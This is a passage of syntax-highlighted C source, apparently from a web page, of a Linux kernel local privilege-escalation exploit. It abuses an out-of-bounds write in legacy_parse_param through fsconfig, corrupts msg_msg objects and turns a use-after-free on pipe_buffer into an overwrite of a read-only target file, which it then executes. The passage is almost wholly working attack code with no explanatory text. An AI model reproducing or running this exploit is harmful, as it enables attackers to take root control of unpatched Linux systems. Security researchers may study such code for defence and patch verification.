    <span class="token function">memset</span><span class="token punctuation">(</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"trigger oob write in `legacy_parse_param` to corrupt messageA's "</span>
           <span class="token string">"msg_msg.m_ts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>buff<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> <span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span> <span class="token comment">// append '=\x00'</span>
  <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"searching corrupted msg_msg for freeing fake msg_msg..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fake_msqid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> n <span class="token operator">=</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0x100</span> <span class="token operator">&amp;&amp;</span> msg_a<span class="token operator">-></span>mtype <span class="token operator">==</span> MTYPE_FAKE<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      fake_msqid <span class="token operator">=</span> msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"fake_msqid = %d"</span><span class="token punctuation">,</span> fake_msqid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fake_msqid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">pipe_primitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"open target file %s"</span><span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>tfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>ATTACK_FILE<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"failed to open target file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"freeing fake msg_msg..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>fake_msqid<span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> MTYPE_FAKE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgrcv() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying pipe_buffer..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"Alloc pipe failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">loff_t</span> offset <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token class-name">ssize_t</span> nbytes <span class="token operator">=</span> <span class="token function">splice</span><span class="token punctuation">(</span>tfd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>offset<span class="token punctuation">,</span> pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>nbytes <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"splice() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"free skbuff_data to make pipe_buffer become UAF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> uaf_pipe_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> backup_skb<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> PIPE_BUF_FLAG_CAN_MERGE <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>skb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sock_pairs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"read from sock pairs failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span>skb<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>pb<span class="token operator">-></span>len <span class="token operator">>=</span> <span class="token number">0x100</span> <span class="token operator">&amp;&amp;</span> pb<span class="token operator">-></span>len <span class="token operator">&lt;</span> <span class="token number">0x100</span> <span class="token operator">+</span> NUM_PIPEFDS<span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        uaf_pipe_idx <span class="token operator">=</span> pb<span class="token operator">-></span>len <span class="token operator">-</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
        <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"uaf_pipe_idx = %d"</span><span class="token punctuation">,</span> uaf_pipe_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>backup_skb<span class="token punctuation">,</span> skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>uaf_pipe_idx <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"uaf_pipe_idx not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"edit pipe_buffer->flags"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span>backup_skb<span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">=</span> PIPE_BUF_FLAG_CAN_MERGE<span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ops <span class="token operator">=</span> pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ops<span class="token punctuation">;</span>
  <span class="token function">spray_skbuff_data</span><span class="token punctuation">(</span>backup_skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>backup_skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"try to overwrite %s, by pipe fd %d"</span><span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">,</span>
           pipe_fd<span class="token punctuation">[</span>uaf_pipe_idx<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>uaf_pipe_idx<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> attack_data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attack_data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span>
      <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attack_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"see if %s changed"</span><span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>tfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  tfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>ATTACK_FILE<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>tfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"open attack file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">char</span> tmp_buffer<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>tfd<span class="token punctuation">,</span> tmp_buffer<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tmp_buffer <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0x56565656</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"overwrite attack file failed: 0x%08x"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fsid<span class="token punctuation">;</span>
  <span class="token keyword">int</span> pid<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>notify_pipe<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"pipe() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">init_unshare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">init_sock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">init_msg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">do_leak_heap</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">close</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"retry do_leak_heap()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">fake_msg_msg_at_kmalloc_1024</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">close</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">create_uaf</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">close</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"retry create_uaf()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">pipe_primitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"exploit success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>notify_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> sync<span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>notify_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sync<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sync <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span>
      <span class="token function">execl</span><span class="token punctuation">(</span>ATTACK_FILE<span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"fork() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

